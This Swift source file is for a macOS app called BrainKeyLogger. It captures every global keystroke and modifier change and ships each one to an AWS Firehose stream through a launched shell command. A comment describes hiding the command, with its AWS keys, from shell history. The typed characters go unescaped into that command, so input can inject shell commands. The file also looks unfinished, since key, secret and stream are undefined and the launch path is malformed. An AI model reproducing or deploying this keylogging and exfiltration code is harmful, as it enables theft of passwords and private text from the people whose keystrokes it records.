//
//  ViewController.swift
//  BrainKeyLogger
//
//  Created by Warren Ronsiek on 12/29/18.
//  Copyright © 2018 Warren Ronsiek. All rights reserved.
//

import Cocoa

class ViewController: NSViewController {
    var keyMonitor: Any?
    var flagMonitor: Any?
    
    var isLogging: Bool = false
    @IBOutlet weak var logs: NSTextView!
    
    @IBAction func toggleLogging(sender: AnyObject) {
        self.logs.textStorage?.append(NSAttributedString(string: "setting logging to: \(!self.isLogging)\n"))
        if !self.isLogging {
            self.keyMonitor = NSEvent.addGlobalMonitorForEvents(matching: [.keyDown]) { (event) in
                self.logs.textStorage?.append(NSAttributedString(string: "logged: \(event.characters ?? "unknown") at time \(event.timestamp)) with keycode \(event.keyCode)\n"))
                self.fireHosePutRecord(flags: event.modifierFlags.rawValue, keyCode: event.keyCode, char: event.characters ?? "NULL", time: Date().timeIntervalSince1970)
            }
            self.flagMonitor = NSEvent.addGlobalMonitorForEvents(matching: [.flagsChanged]) { (event) in
                self.logs.textStorage?.append(NSAttributedString(string: "logged flagchange to \(event.modifierFlags.rawValue) at time \(event.timestamp)) with keycode \(event.keyCode)\n"))
                self.fireHosePutRecord(flags: event.modifierFlags.rawValue, keyCode: event.keyCode, char: event.characters ?? "NULL", time: Date().timeIntervalSince1970)
            }
            
            self.isLogging = true
        } else {
            NSEvent.removeMonitor(keyMonitor as Any)
            NSEvent.removeMonitor(flagMonitor as Any)
            self.isLogging = false
        }
    }
    
    func fireHosePutRecord(flags:UInt, keyCode: UInt16, char: String, time: Double){
        let jsonString:String = "{\"Data\":\"{\\\"flags\\\":\(flags), \\\"keyCode\\\":\(keyCode), \\\"char\\\":\\\"\(char)\\\", \\\"time\\\":\(time)}\"}"
        let task = Process()
        task.launchPath = "/usr/bin/env/"
        //keep the space before the access key, it stops the command from showing up in the command history
        task.arguments = ["  AWS_ACCESS_KEY=\(key) AWS_SECRET_ACCESS_KEY=\(secret) aws firehose put-record --delivery-stream-name \(stream) --record '\(jsonString)'"]
        print(task)
        task.launch()
    }
    

    override func viewDidLoad() {
        super.viewDidLoad()

        let options: NSDictionary = [kAXTrustedCheckOptionPrompt.takeUnretainedValue() as String : true]
        let accessEnabled = AXIsProcessTrustedWithOptions(options)
        
        if !accessEnabled {
            self.logs.textStorage?.append(NSAttributedString(string: "ERROR: permission not yet granted"))
        }
    }

    override var representedObject: Any? {
        didSet {
        // Update the view, if already loaded.
        }
    }


}

